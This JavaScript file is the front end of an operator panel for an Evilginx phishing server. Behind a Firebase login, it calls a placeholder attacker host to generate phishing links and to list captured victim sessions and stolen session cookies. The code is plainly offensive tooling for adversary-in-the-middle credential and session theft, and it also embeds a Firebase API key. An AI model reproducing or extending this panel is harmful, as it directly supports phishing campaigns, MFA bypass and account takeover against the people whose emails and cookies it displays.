const firebaseConfig = {
    apiKey: "AIzaSyDiNWtXm4oHQ6NpHPiLJjV4EDgU7yUQjq0",
    authDomain: "panel-auth-134b7.firebaseapp.com",
    projectId: "panel-auth-134b7",
    storageBucket: "panel-auth-134b7.firebasestorage.app",
    messagingSenderId: "892746068340",
    appId: "Y1:892746068340:web:f8c4d5b798e8bc48447c21"
};

firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();

auth.onAuthStateChanged(user => {
    if (!user) {
        window.location.href = "index.html";
    }
});

function generateLink() {
    fetch("http://YOUR_EVILGINX_SERVER/api/generate-link")
        .then(response => response.json())
        .then(data => {
            document.getElementById("content").innerHTML = `<p>Generated Link: <a href="${data.link}" target="_blank">${data.link}</a></p>`;
        })
        .catch(error => console.error("Error generating link:", error));
}

function loadCapturedSessions() {
    fetch("http://YOUR_EVILGINX_SERVER/api/captured-sessions")
        .then(response => response.json())
        .then(data => {
            let html = "<h3>Captured Sessions</h3><table><tr><th>Email</th><th>IP</th><th>Time</th></tr>";
            data.sessions.forEach(session => {
                html += `<tr><td>${session.email}</td><td>${session.ip}</td><td>${session.time}</td></tr>`;
            });
            html += "</table>";
            document.getElementById("content").innerHTML = html;
        })
        .catch(error => console.error("Error loading sessions:", error));
}

function loadCookies() {
    fetch("http://YOUR_EVILGINX_SERVER/api/cookies")
        .then(response => response.json())
        .then(data => {
            let html = "<h3>Cookies</h3><table><tr><th>Name</th><th>Value</th></tr>";
            data.cookies.forEach(cookie => {
                html += `<tr><td>${cookie.name}</td><td>${cookie.value}</td></tr>`;
            });
            html += "</table>";
            document.getElementById("content").innerHTML = html;
        })
        .catch(error => console.error("Error loading cookies:", error));
}

function logout() {
    auth.signOut().then(() => {
        window.location.href = "index.html";
    });
}
